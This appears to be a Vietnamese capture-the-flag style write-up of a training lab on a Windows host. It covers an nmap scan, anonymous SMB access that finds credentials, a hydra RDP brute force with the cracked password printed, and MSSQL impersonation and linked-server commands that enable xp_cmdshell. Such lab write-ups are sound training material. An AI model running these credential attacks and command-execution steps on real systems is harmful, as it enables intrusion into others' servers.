# Attacking Common Services - Hard

<img width="1117" height="797" alt="image" src="https://github.com/user-attachments/assets/f56eb1da-e733-4e40-8354-0e870308d22d" />

Đối tượng ở đây là `10.129.203.10`, ở đây tôi dùng nmap để scan các port:

```
sudo nmap 10.129.203.10 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
```

Và kết quả được các port như sau:

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-04T12:52:41
| Not valid after:  2055-11-04T12:52:41
| MD5:     c3cd bfeb faa7 601c 4c75 4ab9 3b4b 397b
| SHA-1:   d81f 60c7 e590 519a ce0c c27d eb3a 0d76 182c acd0
|_SHA-256: a225 565b 469a 8e54 8ef9 4ad5 acb5 5007 643a 6553 8bcf 17eb 9dbf 1330 1c55 fd74
|_ssl-date: 2025-11-04T13:08:03+00:00; -21s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-HARD
| Issuer: commonName=WIN-HARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-03T12:52:29
| Not valid after:  2026-05-05T12:52:29
| MD5:     da50 d0e2 713c 0ae4 2414 1b4b 06b7 9edc
| SHA-1:   c171 e55f b638 5d26 3470 8293 f0fb 6610 65ca 2a03
|_SHA-256: 223f 1c32 b7e1 f063 a065 d3a8 cb5b 8883 4425 bd1a c30d 2f50 5b68 fc36 b5a2 308a
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-04T13:07:24+00:00
|_ssl-date: 2025-11-04T13:08:03+00:00; -20s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-04T13:07:25
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -20s, deviation: 0s, median: -21s
```

Dùng:

```
smbclient -N //10.129.203.10/home
```

Để xem các thư mục có trên smb và tìm được 1 số file nhạy cảm như creds.txt:

<img width="920" height="977" alt="image" src="https://github.com/user-attachments/assets/1b64bd0f-7524-46be-a422-b3c6696d0168" />

Tôi thử brute các user thì được Fiona:

```
$ hydra -l 'Fiona' -P ~/road_to_hecker/fiona_pass 10.129.203.10 rdp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 22:17:33
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
[DATA] attacking rdp://10.129.203.10:3389/
[3389][rdp] host: 10.129.203.10   login: Fiona   password: 48Ns72!bns74@S84NNNSl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-04 22:17:39
```

Kết nối vào rdp thông qua lệnh `rdesktop -u Fiona -p 48Ns72!bns74@S84NNNSl 10.129.203.10`:

<img width="1918" height="1027" alt="image" src="https://github.com/user-attachments/assets/5336f40d-12d2-4279-ac70-fb4ece854bb0" />

Tôi có thử sử dụng `mimikatz.exe` và `LaZagne.exe` để tìm mật khẩu nhạy cảm nhưng không thấy.

Trong database của mssql cũng không có thông tin gì đặc biệt:

<img width="1027" height="890" alt="image" src="https://github.com/user-attachments/assets/3a3060bd-dbca-4782-960c-c33223f81fac" />

Tôi kiếm được câu truy vấn dùng để liệt kê các login/role đã từng cấp quyền IMPERSONATE cho người khác 

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

<img width="930" height="728" alt="image" src="https://github.com/user-attachments/assets/bb88f612-d664-4cbc-b534-39b5fb97a1c1" />

Ở đây gồm có John và Simon, khi login vào John thì check john là người đã cấp (grantor) quyền IMPERSONATE cho ai đó ở cấp server

<img width="835" height="355" alt="image" src="https://github.com/user-attachments/assets/06666622-8cf4-4172-aad8-d703aef0863a" />

Cấu hình lại và có thể thực thi được cmd:

```
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```

<img width="859" height="649" alt="image" src="https://github.com/user-attachments/assets/6a4d471f-a8ef-49c2-a740-d411790c1941" />

<img width="750" height="272" alt="image" src="https://github.com/user-attachments/assets/7f8c5b5d-ae67-41f7-a1bd-0b82c2cc3370" />

